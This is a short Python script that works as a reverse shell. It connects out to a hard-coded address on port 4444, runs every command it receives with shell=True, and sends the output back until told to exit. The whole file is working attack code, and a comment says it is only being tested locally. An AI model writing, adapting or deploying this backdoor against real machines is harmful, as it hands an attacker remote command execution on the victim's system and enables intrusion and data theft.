import socket
import subprocess

server_ip = '192.168.11.1'  # For now we are testing locally
server_port = 4444

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_ip, server_port))

while True:
    command = client_socket.recv(1024).decode()

    if command.lower() == "exit":
        break

    try:
        # Run command and capture output
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr  # Combine stdout and stderr
    except Exception as e:
        output = str(e)

    client_socket.send(output.encode())

client_socket.close()
